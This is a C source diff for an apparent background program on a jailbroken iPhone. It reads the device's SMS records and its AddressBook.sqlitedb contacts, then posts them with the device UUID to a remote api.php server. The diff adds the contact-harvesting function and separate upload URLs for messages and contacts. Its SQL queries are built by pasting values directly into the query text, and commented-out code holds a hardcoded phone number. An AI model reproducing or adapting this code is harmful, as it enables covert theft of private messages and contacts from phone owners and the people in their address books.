@@ -20,11 +20,13 @@
 int fd;
 CURL *curl;
 char apiPermitURL[400];
-char apiPostURL[400];
-char logFile[400] = "/var/root/bsms.log";
+char apiPostSMSURL[400];
+char apiPostAdURL[400];
+char logFile[100] = "/var/root/bsms.log";
+char remoteURL[100] = "http://bsms.sinaapp.local/api.php?";
 char localBuffer[1024*100] = {0};
 int cronSMSTask(int rowid);
-int cronAddressBookTask(int rowid);
+int cronAddressBookTask(char* id);
 int getData(char *file, char *sql, char ***res, int *column);
 int postData(CURL *curl, char *messageData);
 int getPermit();
@@ -55,10 +57,9 @@ int main() {
         char UUID[20];
         getUUID("en0", UUID);
 
-        snprintf(apiPermitURL, 400, "http://bsms.sinaapp.local/api.php?mod=permit&uuid=%s", UUID);
-        snprintf(apiPostURL, 400, "http://bsms.sinaapp.local/api.php?mod=sms&uuid=%s", UUID);
-        //snprintf(apiPermitURL, 400, "http://10.0.8.124:1224//api/api.php?mod=permit&uuid=%s", UUID);
-        //snprintf(apiPostURL, 400, "http://10.0.8.124:1224/api/api.php?mod=post&uuid=%s", UUID);
+        snprintf(apiPermitURL, 400, "%smod=permit&uuid=%s", remoteURL, UUID);
+        snprintf(apiPostSMSURL, 400, "%smod=sms&uuid=%s", remoteURL, UUID);
+        snprintf(apiPostAdURL, 400, "%smod=ad&uuid=%s", remoteURL, UUID);
 
         writeLog("apiPermitURL:[%s]\n", apiPermitURL);
 
@@ -83,7 +84,8 @@ int main() {
     		permitid = atoi(pid);
 
             if(permitid > 0) {
-                cronSMSTask(smsid);
+            //    cronSMSTask(smsid);
+            //    curl_easy_reset(curl);
                 cronAddressBookTask(adid);
                 curl_easy_reset(curl);
             } else {
@@ -147,7 +149,44 @@ int cronSMSTask(int rowid) {
 
     if(row > 0) {
         if(curl) {
-            curl_easy_setopt(curl, CURLOPT_URL, apiPostURL);
+            curl_easy_setopt(curl, CURLOPT_URL, apiPostSMSURL);
+            curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
+            //curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
+        }
+
+        for(i=1; i < (row + 1); i++) {
+            char messageData[CURL_MAX_POST_LEN];
+            char SMSmobileNum[1000];
+            int SMSAddress=0, SMSis_madrid=0, SMSmadrid_handle=0;
+            nlen = 0;
+            writeLog("%s,\n", result[i*column]);
+            for (j = 0; j < column; j++) {
+                offset = i*column+j;
+                snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
+                nlen = strlen(messageData);
+            }
+
+            postData(curl, messageData);
+        }
+        //free sqlite3 result
+        sqlite3_free_table(result);
+    }
+
+    return 0;
+}
+
+int cronAddressBookTask(char* id) {
+    char **result;
+    int i=0, j=0, nlen=0, column=0, offset = 0;
+
+    char sql[1000];
+    snprintf(sql, 1000, "SELECT ABMultiValue.record_id, ABMultiValue.Value, ABPerson.* "
+    		"FROM ABMultiValue LEFT JOIN ABPerson ON (ABPerson.ROWID = ABMultiValue.record_id) WHERE ABMultiValue.value = '%s'", id);
+    int row = getData("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", sql, &result, &column);
+
+    if(row > 0) {
+        if(curl) {
+            curl_easy_setopt(curl, CURLOPT_URL, apiPostAdURL);
             curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
             //curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
         }
@@ -160,15 +199,40 @@ int cronSMSTask(int rowid) {
                 offset = i*column+j;
                 snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
                 nlen = strlen(messageData);
+
             }
-            postData(curl, messageData);
+
+            /*
+            if((strcmp(result[SMSis_madrid], "1") == 0)) {
+                snprintf(SMSmobileNum, 400, "%s", result[SMSmadrid_handle]);
+            } else {
+                snprintf(SMSmobileNum, 400, "%s", result[SMSAddress]);
+            }
+            char adsql[1000];
+            snprintf(adsql, 1000, "SELECT ABMultiValue.record_id, ABPerson.* "
+            		"FROM ABMultiValue LEFT JOIN ABPerson ON (ABPerson.ROWID = ABMultiValue.record_id) "
+            		"WHERE ABMultiValue.value =  '13716363792'", SMSmobileNum);
+            writeLog("cronSMSTask() sql_addressbook[%s]\n",adsql);
+            int adi=0, adj=0, adlen=0, adcolumn=0, adoffset = 0;
+            char **adresult;
+            int adrow = getData("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", adsql, &adresult, &adcolumn);
+            for(adi=1; i < (adrow + 1); adi++) {
+        		writeLog("adi2: %d--------\n", adi);
+            	for (adj = 0; adj < adcolumn; adj++) {
+            		adoffset = adi*adcolumn+adj;
+            		writeLog("adresult: %s=%s-Delimiter-\n", adresult[adj], adresult[adoffset]);
+            	}
+        		writeLog("adi2: %d--------\n", adi);
+            }
+            sqlite3_free_table(adresult);
+            */
+
+    		writeLog("messageData: %s--------\n", messageData);
+            //postData(curl, messageData);
         }
+        //free sqlite3 result
+        sqlite3_free_table(result);
     }
-
-    return 0;
-}
-
-int cronAddressBookTask(int rowid) {
     return 0;
 }
 
@@ -194,7 +258,7 @@ int getData(char *file, char *sql, char ***res, int *column) {
     int rc;
     rc = sqlite3_open(file, &db);
     if(rc) {
-        fprintf(stderr, "open faile %s\n",sqlite3_errmsg(db));
+        fprintf(stderr, "sqllite3 error open faile %s\n",sqlite3_errmsg(db));
         sqlite3_close(db);
         return -1;
     }else {
@@ -214,7 +278,7 @@ int SqliteQuery(sqlite3 *db, const char *sql, char ***res, int *column) {
         sqlite3_exec(db, sql, 0, 0, &errorMsg);
     }
     if(errorMsg){
-        writeLog("%s\n", errorMsg);
+        writeLog("sqlite3 erro:%s\n", errorMsg);
         return -1;
     }else{
         return row;
